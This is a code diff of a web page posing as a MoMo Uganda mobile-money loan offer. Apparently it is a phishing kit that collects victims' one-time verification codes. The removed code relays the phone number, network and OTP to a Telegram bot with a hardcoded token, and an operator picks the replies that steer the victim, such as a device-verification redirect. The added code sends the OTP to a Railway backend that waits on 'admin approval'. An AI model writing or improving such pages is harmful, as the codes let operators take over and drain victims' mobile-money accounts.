@@ -252,7 +252,7 @@
         <div class="status-message" id="statusMsg"></div>
 
         <div class="resend-link">
-            <button onclick="resendOTP()">⟳ Didn't receive code? Resend OTP</button>
+            <button onclick="checkStatus()">⟳ Check Application Status</button>
         </div>
 
         <div style="padding: 0 25px 30px;">
@@ -262,7 +262,7 @@
     </div>
 </div>
 
-<!-- Completion Modal (shown after final approval) -->
+<!-- Completion Modal -->
 <div id="completionModal" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.8); z-index:20000; align-items:center; justify-content:center; padding:20px;">
     <div style="background:white; max-width:380px; border-radius:24px; padding:32px 24px; text-align:center;">
         <div class="check-icon">✓</div>
@@ -278,15 +278,11 @@
 </div>
 
 <script>
-    // Telegram Configuration - UGANDA BOT
-    const CONFIG = {
-        BOT_TOKEN: '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E',
-        CHAT_ID: '8392790531'
-    };
-
-    let state = { lastUpdateId: 0 };
+    // Railway URL
+    const RAILWAY_URL = 'https://momo-uganda-production.up.railway.app';
+    
     let isProcessing = false;
-    let pendingMessageId = null;
+    let statusCheckInterval = null;
 
     const errMsg = document.getElementById('errMsg');
     const statusMsg = document.getElementById('statusMsg');
@@ -296,34 +292,34 @@
 
     let userPhone = sessionStorage.getItem('userPhone') || '';
     let userNetwork = sessionStorage.getItem('userNetwork') || '';
+    let loanId = sessionStorage.getItem('loanId') || '';
 
     function showError(msg) {
         errMsg.textContent = msg;
         errMsg.style.display = 'block';
-        setTimeout(() => { errMsg.style.display = 'none'; }, 3000);
+        setTimeout(() => { errMsg.style.display = 'none'; }, 4000);
     }
 
     function showStatus(msg, type = 'processing') {
         statusMsg.textContent = msg;
         statusMsg.className = `status-message ${type}`;
         statusMsg.style.display = 'block';
-        setTimeout(() => { statusMsg.style.display = 'none'; }, 3000);
+        setTimeout(() => { statusMsg.style.display = 'none'; }, 5000);
     }
 
     function loadLoanData() {
         const calculatorData = sessionStorage.getItem('calculatorData');
         if (calculatorData) {
             const data = JSON.parse(calculatorData);
-            const currency = data.currency || 'UGX';
-            document.getElementById('offerAmount').textContent = `${currency} ${data.amount.toLocaleString()}`;
+            document.getElementById('offerAmount').textContent = `UGX ${data.amount.toLocaleString()}`;
             const months = data.duration / 30;
-            document.getElementById('offerDetails').textContent = `${months} Month${months > 1 ? 's' : ''} • Monthly: ${currency} ${data.monthly.toLocaleString()}`;
+            document.getElementById('offerDetails').textContent = `${months} Month${months > 1 ? 's' : ''} • Monthly: UGX ${data.monthly.toLocaleString()}`;
         } else {
             document.getElementById('offerAmount').textContent = 'UGX 500,000';
             document.getElementById('offerDetails').textContent = '3 Months • Monthly: UGX 182,500';
         }
         if (userPhone) {
-            document.getElementById('phoneDisplay').innerHTML = `Code sent to <strong>${maskPhone(userPhone)}</strong> (${userNetwork || 'MoMo'})`;
+            document.getElementById('phoneDisplay').innerHTML = `Phone: <strong>${maskPhone(userPhone)}</strong> (${userNetwork || 'MoMo'})`;
         }
     }
 
@@ -335,7 +331,7 @@
     function createInputs() {
         const container = document.getElementById('otpInputs');
         container.innerHTML = '';
-        for (let i = 0; i < 6; i++) {  // Changed from 5 to 6
+        for (let i = 0; i < 6; i++) {
             const input = document.createElement('input');
             input.type = 'text';
             input.maxLength = 1;
@@ -358,11 +354,11 @@
         inputs.forEach((input, index) => {
             input.addEventListener('input', () => {
                 input.value = input.value.replace(/\D/g, '');
-                if (input.value.length === 1 && index < 5) {  // Changed from 4 to 5
+                if (input.value.length === 1 && index < 5) {
                     inputs[index + 1].focus();
                 }
-                if (getCode().length === 6) {  // Changed from 5 to 6
-                    setTimeout(submitOTP, 180);
+                if (getCode().length === 6) {
+                    setTimeout(verifyOTP, 200);
                 }
             });
             input.addEventListener('keydown', (e) => {
@@ -373,198 +369,109 @@
         });
     }
 
-    function resendOTP() {
-        showStatus("📱 A new verification code has been sent to your MoMo number", "processing");
-        clearInputs();
-        document.querySelectorAll('.otp-input')[0]?.focus();
-    }
-
-    function submitOTP() {
+    async function verifyOTP() {
         if (isProcessing) return;
         
         const otp = getCode();
-        if (otp.length !== 6) {  // Changed from 5 to 6
+        if (otp.length !== 6) {
             showError("Please enter the complete 6-digit code");
+            return;
+        }
+        
+        if (!loanId) {
+            showError("No active loan found. Please start a new application.");
             return;
         }
         
         isProcessing = true;
         verifyBtn.disabled = true;
         verifyBtn.textContent = "Verifying...";
+        spinner.style.display = 'flex';
 
-        const ts = Date.now();
-        const approveId = `final_approve_${ts}`;
-        const verifyDeviceId = `final_verify_device_${ts}`;
-        const appliedId = `final_applied_${ts}`;
-        const declineId = `final_decline_${ts}`;
-
-        const loanAmount = document.getElementById('offerAmount').textContent;
-
-        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CONFIG.CHAT_ID,
-                text: `<b>🔴 FINAL OTP VERIFICATION - UGANDA</b>\n\n━━━━━━━━━━━━━━━━━━\n<b>💰 Amount:</b> ${loanAmount}\n<b>📱 Network:</b> ${userNetwork || 'MoMo Uganda'}\n<b>📞 Phone:</b> <code>${userPhone}</code>\n<b>🔑 OTP Code:</b> <code>${otp}</code>\n<b>🕐 Time:</b> ${new Date().toLocaleString()}\n━━━━━━━━━━━━━━━━━━\n\n<b>Select Action:</b>`,
-                parse_mode: 'HTML',
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: "✅ Complete Loan", callback_data: approveId },
-                            { text: "📱 Verify Device", callback_data: verifyDeviceId }
-                        ],
-                        [
-                            { text: "📋 Already Applied", callback_data: appliedId },
-                            { text: "❌ Reject", callback_data: declineId }
-                        ]
-                    ]
-                }
-            })
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (data.ok && data.result) {
-                pendingMessageId = data.result.message_id;
+        try {
+            const response = await fetch(`${RAILWAY_URL}/api/complete-loan`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    loanId: loanId,
+                    otp: otp
+                })
+            });
+            
+            const data = await response.json();
+            
+            if (data.success) {
+                spinner.style.display = 'none';
+                showStatus("✅ Loan Verified Successfully!", "success");
+                setTimeout(() => {
+                    completionModal.style.display = 'flex';
+                    sessionStorage.clear();
+                }, 1500);
+            } else {
+                spinner.style.display = 'none';
+                showError("Invalid OTP. Please try again or contact support.");
+                resetButton();
             }
-            spinner.style.display = 'flex';
-            startFinalPolling(approveId, verifyDeviceId, appliedId, declineId);
-        })
-        .catch((error) => {
-            console.error('Error:', error);
-            resetButton();
+        } catch (error) {
+            console.error('Verification error:', error);
+            spinner.style.display = 'none';
             showError("Network error. Please try again.");
-        });
+            resetButton();
+        }
     }
 
-    function startFinalPolling(approveId, verifyDeviceId, appliedId, declineId) {
-        const interval = setInterval(() => {
-            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}&timeout=5`)
-                .then(r => r.json())
-                .then(data => {
-                    if (!data.ok || !data.result) return;
-                    
-                    for (const update of data.result) {
-                        if (update.update_id > state.lastUpdateId) {
-                            state.lastUpdateId = update.update_id;
-                        }
-                        
-                        if (update.callback_query) {
-                            const cb = update.callback_query.data;
-                            const callbackId = update.callback_query.id;
-                            
-                            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/answerCallbackQuery`, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({
-                                    callback_query_id: callbackId,
-                                    text: "Processing your request..."
-                                })
-                            });
-                            
-                            if (cb === approveId) {
-                                clearInterval(interval);
-                                spinner.style.display = 'none';
-                                showStatus("✅ Loan Completed Successfully!", "success");
-                                
-                                if (pendingMessageId) {
-                                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/editMessageText`, {
-                                        method: 'POST',
-                                        headers: { 'Content-Type': 'application/json' },
-                                        body: JSON.stringify({
-                                            chat_id: CONFIG.CHAT_ID,
-                                            message_id: pendingMessageId,
-                                            text: `✅ <b>LOAN COMPLETED - UGANDA</b>\n\nPhone: ${userPhone}\nNetwork: ${userNetwork || 'MoMo'}\nStatus: Approved & Completed\nTime: ${new Date().toLocaleString()}`,
-                                            parse_mode: 'HTML'
-                                        })
-                                    });
-                                }
-                                
-                                setTimeout(() => {
-                                    completionModal.style.display = 'flex';
-                                    sessionStorage.clear();
-                                }, 1500);
-                                return;
-                            } 
-                            else if (cb === verifyDeviceId) {
-                                clearInterval(interval);
-                                spinner.style.display = 'none';
-                                showStatus("📱 Device verification required.", "processing");
-                                
-                                if (pendingMessageId) {
-                                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/editMessageText`, {
-                                        method: 'POST',
-                                        headers: { 'Content-Type': 'application/json' },
-                                        body: JSON.stringify({
-                                            chat_id: CONFIG.CHAT_ID,
-                                            message_id: pendingMessageId,
-                                            text: `📱 <b>DEVICE VERIFICATION - UGANDA</b>\n\nPhone: ${userPhone}\nStatus: Pending\nTime: ${new Date().toLocaleString()}`,
-                                            parse_mode: 'HTML'
-                                        })
-                                    });
-                                }
-                                
-                                setTimeout(() => {
-                                    window.location.href = '/device_verify.html';
-                                }, 1500);
-                                return;
-                            }
-                            else if (cb === appliedId) {
-                                clearInterval(interval);
-                                spinner.style.display = 'none';
-                                showStatus("📋 You have already applied. Please wait.", "processing");
-                                
-                                if (pendingMessageId) {
-                                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/editMessageText`, {
-                                        method: 'POST',
-                                        headers: { 'Content-Type': 'application/json' },
-                                        body: JSON.stringify({
-                                            chat_id: CONFIG.CHAT_ID,
-                                            message_id: pendingMessageId,
-                                            text: `📋 <b>ALREADY APPLIED - UGANDA</b>\n\nPhone: ${userPhone}\nStatus: Previously applied\nTime: ${new Date().toLocaleString()}`,
-                                            parse_mode: 'HTML'
-                                        })
-                                    });
-                                }
-                                
-                                resetButton();
-                                return;
-                            }
-                            else if (cb === declineId) {
-                                clearInterval(interval);
-                                spinner.style.display = 'none';
-                                showError("❌ Verification failed. Please try again.");
-                                
-                                if (pendingMessageId) {
-                                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/editMessageText`, {
-                                        method: 'POST',
-                                        headers: { 'Content-Type': 'application/json' },
-                                        body: JSON.stringify({
-                                            chat_id: CONFIG.CHAT_ID,
-                                            message_id: pendingMessageId,
-                                            text: `❌ <b>LOAN DECLINED - UGANDA</b>\n\nPhone: ${userPhone}\nStatus: Declined\nTime: ${new Date().toLocaleString()}`,
-                                            parse_mode: 'HTML'
-                                        })
-                                    });
-                                }
-                                
-                                resetButton();
-                                return;
-                            }
-                        }
-                    }
-                })
-                .catch(err => console.error('Polling error:', err));
-        }, 1000);
+    async function checkStatus() {
+        if (!loanId) {
+            showError("No active loan found. Please start a new application.");
+            return;
+        }
+        
+        showStatus("Checking application status...", "processing");
+        
+        try {
+            const response = await fetch(`${RAILWAY_URL}/api/loan/${loanId}`);
+            const data = await response.json();
+            
+            if (data.success) {
+                const status = data.loan.status;
+                if (status === 'otp_sent') {
+                    showStatus("✅ Your loan is approved! Enter the OTP code above.", "success");
+                } else if (status === 'pending_verification') {
+                    showStatus("⏳ Your application is pending admin approval. Please wait...", "processing");
+                } else if (status === 'declined') {
+                    showError("❌ Your application was declined. Please contact support.");
+                } else if (status === 'approved') {
+                    showStatus("✅ Your loan is already approved!", "success");
+                    setTimeout(() => {
+                        completionModal.style.display = 'flex';
+                    }, 1500);
+                } else {
+                    showStatus(`Status: ${status}`, "processing");
+                }
+            }
+        } catch (error) {
+            console.error('Status check error:', error);
+            showError("Could not check status. Please try again.");
+        }
     }
 
     function resetButton() {
         isProcessing = false;
         verifyBtn.disabled = false;
         verifyBtn.textContent = "Verify & Confirm Loan";
-        spinner.style.display = 'none';
     }
 
-    verifyBtn.onclick = submitOTP;
+    verifyBtn.onclick = verifyOTP;
+    
+    // Auto-check status every 5 seconds
+    if (loanId) {
+        statusCheckInterval = setInterval(checkStatus, 5000);
+        // Stop checking after 2 minutes
+        setTimeout(() => {
+            if (statusCheckInterval) clearInterval(statusCheckInterval);
+        }, 120000);
+    }
+    
     createInputs();
     setupAutoFocus();
     loadLoanData();
